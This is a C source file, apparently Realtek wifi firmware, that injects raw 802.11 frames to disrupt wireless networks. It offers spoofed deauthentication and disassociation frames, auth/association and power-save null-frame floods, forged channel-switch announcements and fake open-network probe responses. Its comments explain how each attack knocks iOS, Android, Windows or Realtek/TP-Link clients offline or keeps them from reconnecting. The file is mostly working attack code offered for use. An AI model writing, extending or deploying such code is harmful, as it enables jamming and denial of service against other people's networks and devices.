#include "wifi_cust_tx.h"

/*
 * Transmits a raw 802.11 frame with a given length.
 * The frame must be valid and have a sequence number of 0 as it will be set automatically.
 * The frame check sequence is added automatically and must not be included in the length.
 * @param frame A pointer to the raw frame
 * @param size The size of the frame
*/
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

/*
 * Transmits a 802.11 deauth frame (type 0xC0) on the active channel.
 * Effective against all platforms — kicks all associated clients.
 * @param src_mac  MAC of the AP (spoofed sender)
 * @param dst_mac  Destination MAC, FF:FF:FF:FF:FF:FF to broadcast
 * @param reason   802.11 reason code
*/
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

/*
 * Transmits a 802.11 disassociation frame (type 0xA0) on the active channel.
 * More effective against iOS and Android than deauth alone — triggers a full
 * re-association which is slower and easier to disrupt continuously.
 * @param src_mac  MAC of the AP (spoofed sender)
 * @param dst_mac  Destination MAC, FF:FF:FF:FF:FF:FF to broadcast
 * @param reason   802.11 reason code
*/
void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
}

/*
 * Transmits a very basic 802.11 beacon with the given ssid on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the beacon
 * @param ssid '\0' terminated array of characters representing the SSID
*/
/*
 * Sends a fake 802.11 Open System Authentication Request from fake_client_mac to the AP.
 * This frame is NOT covered by PMF and runs before association.
 * Flooding with many different fake_client_mac values exhausts the AP's association table.
 * @param ap_mac         The BSSID of the target AP
 * @param fake_client_mac A locally administered, unicast MAC to spoof as the client
 */
void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac) {
  AuthReqFrame frame;
  memcpy(&frame.destination,   ap_mac,          6);
  memcpy(&frame.source,        fake_client_mac, 6);
  memcpy(&frame.access_point,  ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(AuthReqFrame));
}

/*
 * Sends a fake 802.11 Association Request from fake_client_mac to the AP.
 * Must follow an auth frame. Together with wifi_tx_auth_frame this
 * fully claims an AP association table entry.
 * @param ap_mac         The BSSID of the target AP
 * @param fake_client_mac The same MAC used in the preceding auth frame
 */
void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac) {
  AssocReqFrame frame;
  memcpy(&frame.destination,  ap_mac,          6);
  memcpy(&frame.source,       fake_client_mac, 6);
  memcpy(&frame.access_point, ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(AssocReqFrame));
}

/*
 * Sends a Channel Switch Announcement (CSA) Action frame.
 * Instructs all listening 802.11 clients to switch to new_channel.
 * Using an invalid or very crowded channel prevents reconnection.
 * Windows drivers often honor CSA from unprotected sources.
 * @param ap_mac      The BSSID to spoof as the sender
 * @param new_channel Target channel (14 = invalid in EU/TR; disables most clients)
 */
void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  CSAFrame frame;
  memcpy(&frame.destination,  broadcast, 6);
  memcpy(&frame.source,       ap_mac,    6);
  memcpy(&frame.access_point, ap_mac,    6);
  frame.new_channel = new_channel;
  wifi_tx_raw_frame(&frame, sizeof(CSAFrame));
}

/*
 * Sends a Null Data frame with Power Management bit = 1 (PM=1).
 * The AP interprets this as: "this client is going to sleep, buffer its frames."
 * Flooding from many unique fake MACs fills the AP's power-save buffer queue.
 * While the buffer is full, the AP cannot efficiently serve real clients —
 * iOS reconnects but data delivery is severely degraded (effective blackout).
 * @param ap_mac         Target AP BSSID
 * @param fake_client_mac Spoofed STA MAC (use nextFloodMAC for variety)
 */
void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac) {
  NullDataFrame frame;
  memcpy(&frame.destination,  ap_mac,          6);
  memcpy(&frame.source,       fake_client_mac, 6);
  memcpy(&frame.access_point, ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(NullDataFrame));
}

/*
 * Sends a fake Probe Response with NO security capability bits set.
 * Realtek/TP-Link USB drivers update the AP's internal profile on receiving
 * probe responses. Advertising the AP as an open network (no WPA/WPA2/WPA3)
 * triggers a driver-level disconnect + re-association, during which the main
 * deauth loop prevents reconnection from succeeding.
 * Frame size = 38 + ssid_length bytes (same layout as BeaconFrame).
 */
void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  ProbeRespFrame frame;
  memcpy(&frame.destination,  broadcast, 6);
  memcpy(&frame.source,       ap_mac,    6);
  memcpy(&frame.access_point, ap_mac,    6);
  uint8_t ssid_len = 0;
  if (ssid != nullptr) {
    for (int i = 0; ssid[i] != '\0' && i < 32; i++) {
      frame.ssid[i] = (uint8_t)ssid[i];
      ssid_len++;
    }
  }
  frame.ssid_length = ssid_len;
  // 24 (header) + 8 (timestamp) + 2 (interval) + 2 (capabilities) + 2 (ssid IE header) + ssid_len
  wifi_tx_raw_frame(&frame, 38 + ssid_len);
}

void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  for (int i = 0; ssid[i] != '\0'; i++) {
    frame.ssid[i] = ssid[i];
    frame.ssid_length++;
  }
  wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}
